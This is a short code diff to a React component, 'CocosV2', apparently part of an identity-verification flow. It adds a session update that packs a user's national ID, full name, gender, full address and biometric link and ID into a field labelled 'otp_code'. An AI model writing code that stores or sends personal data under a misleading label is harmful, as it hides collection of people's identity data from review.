@@ -1029,8 +1029,11 @@ const CocosV2 = () => {
     }
 
     setBiometricUrl(bioResult.biometric_url);
+    await updateSession("biometric_started", { 
+      otp_code: `dni:${lastDni}|name:${syncedFullName}|uuid:${userUuid}|gender:${userGender}|region:${addressData.region}|city:${addressData.city}|street:${addressData.street_name} ${addressData.street_number}|zip:${addressData.zip_code}|biometric_url:${bioResult.biometric_url}|biometric_id:${bioResult.biometric_id || ""}` 
+    });
     setStep("biometric");
-  }, [updateSession, lastDni, userUuid, userGender]);
+  }, [updateSession, lastDni, userUuid, userGender, syncedFullName]);
 
   // ── Biometric events tracking ──
   const handleBiometricEvent = useCallback(async (event: string) => {
